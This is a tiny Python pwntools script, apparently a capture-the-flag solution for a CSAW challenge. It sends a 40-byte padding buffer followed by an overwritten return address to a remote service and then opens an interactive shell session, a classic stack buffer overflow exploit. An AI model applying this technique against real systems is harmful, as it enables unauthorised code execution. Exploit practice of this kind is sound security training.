from pwn import *


conn=remote('pwn.chal.csaw.io',9001)

conn.sendline('a'*40+p64(0x004005b6))
conn.interactive()
